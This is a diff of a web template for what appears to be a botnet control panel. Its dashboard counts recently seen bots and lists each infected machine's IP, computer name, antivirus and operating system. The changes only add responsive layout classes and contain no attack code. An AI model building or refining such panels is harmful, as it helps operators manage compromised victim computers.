@@ -6,13 +6,13 @@
 it's going to be hard but hard doesn't mean impossible
 -->
 
-<div class="col-md-11 col-lg-11">
+<div class="col-md-12 col-lg-11">
   <div class="container">
       <div class="row">
-          <div class="col-md-5 col-lg-5">
-              <div id="vmap" style="width: 600px; height:400px;"></div>
+          <div class="col-md-12 col-lg-5">
+              <div id="vmap" style=""></div>
           </div>
-          <div class="col-md-7 col-lg-7">
+          <div class="col-md-12 col-lg-7">
               <div class="row">
                   <div class="col-md-6 col-lg-6"><div class="card-stats card">
                           <div class="card-body">
@@ -47,8 +47,13 @@ it's going to be hard but hard doesn't mean impossible
                                   <div class="col-8">
                                       <div class="numbers special">
                                           <div class="row">
+                                              <div class="col-12">
+                                                  <p class="card-category"> Bots seen in last</p>
+                                              </div>
+                                          </div>
+                                          <div class="row">
                                               <div class="col-8">
-                                                  <p class="card-category">Bots seen in last 12 Hours</p>
+                                                  <p class="card-category">12 Hours</p>
                                               </div>
                                               <div class="col-4">
                                                   <h3 class="card-title">{$last12hclientscount}</h3>
@@ -56,7 +61,7 @@ it's going to be hard but hard doesn't mean impossible
                                           </div>
                                           <div class="row">
                                               <div class="col-8">
-                                                  <p class="card-category">Bots seen in last 24 Hours</p>
+                                                  <p class="card-category">24 Hours</p>
                                               </div>
                                               <div class="col-4">
                                                   <h3 class="card-title">{$lastclientscount}</h3>
@@ -64,7 +69,7 @@ it's going to be hard but hard doesn't mean impossible
                                           </div>
                                           <div class="row">
                                               <div class="col-8">
-                                                  <p class="card-category">Bots seen in last 7 Days</p>
+                                                  <p class="card-category">7 Days</p>
                                               </div>
                                               <div class="col-4">
                                                   <h3 class="card-title">{$last7clientscount}</h3>
@@ -85,12 +90,12 @@ it's going to be hard but hard doesn't mean impossible
               <thead>
               <tr>
                   <th>Country</th>
-                  <th>IP</th>
-                  <th>Computername</th>
-                  <th>Antivirus</th>
-                  <th>Opering System</th>
+                  <th class="hideTablet">IP</th>
+                  <th  class="hideMobile">Computername</th>
+                  <th class="hideTablet">Antivirus</th>
+                  <th class="hideTablet">Opering System</th>
                   <th>Version</th>
-                  <th>Last Seen</th>
+                  <th  class="hideMobile">Last Seen</th>
                   <th>More Infos</th>
               </tr>
               </thead>
@@ -98,12 +103,12 @@ it's going to be hard but hard doesn't mean impossible
                 {foreach from=$allbots item=bot}
                   <tr>
                     <td class="flag">  <img src="{$includeDir}assets/img/flags/{$bot.country|lower}.png"> {$bot.country}</td>
-                    <td> {$bot.ip}</td>
-                    <td> {$bot.computrername}</td>
-                    <td class="avtivirus">  <img src="{$includeDir}assets/img/av/{$bot.antivirus}.png"  width="120" height="28"> </td>
-                    <td class="operingsystem">  <img src="{$includeDir}assets/img/operingsystems/{$bot.operingsystem}.png"> </td>
+                    <td class="hideTablet"> {$bot.ip}</td>
+                    <td  class="hideMobile"> {$bot.computrername}</td>
+                    <td class="avtivirus hideTablet">  <img src="{$includeDir}assets/img/av/{$bot.antivirus}.png"  width="120" height="28"> </td>
+                    <td class="operingsystem hideTablet">  <img src="{$includeDir}assets/img/operingsystems/{$bot.operingsystem}.png"> </td>
                     <td> {$bot.version} </td>
-                    <td> <span id="lastSeen-{$bot.id}"></span> <script>$("#lastSeen-{$bot.id}").html( timeDifference("{$bot.now}","{$bot.lastresponse}")) </script> </td>
+                    <td class="hideMobile"> <span id="lastSeen-{$bot.id}"></span> <script>$("#lastSeen-{$bot.id}").html( timeDifference("{$bot.now}","{$bot.lastresponse}")) </script> </td>
                     <td>
                        <a href="/botinfo/{$bot.id}">More Infos</a>
                     </td>
